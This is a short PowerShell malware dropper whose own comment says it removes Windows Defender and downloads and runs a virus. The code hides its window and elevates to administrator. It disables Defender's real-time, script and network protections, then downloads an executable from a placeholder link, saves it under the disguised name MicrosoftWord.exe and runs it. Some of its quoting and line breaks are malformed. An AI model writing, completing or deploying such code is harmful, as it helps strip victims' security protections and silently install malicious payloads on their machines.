#currently this ps1 file will ,on execution, delete Windows defender and download + execute a virus.

$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

Start-Process -FilePath "powershell" -Verb
RunAs -WindowStyle hidden -ArgumentList "
Start-Sleep -s 300
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend 
Start-sleep -s 1800
Start-Process -FilePath "powershell" -Verb
RunAs -WindowStyle hidden -ArgumentList "$source = "Link"; $destination = "%TEMP%\MicrosoftWord.exe"; Invoke-WebRequest $source -OutFile $destination;
Start-Process -FilePath %TEMP%\MicrosoftWord.exe -Verb RunAs" "
exit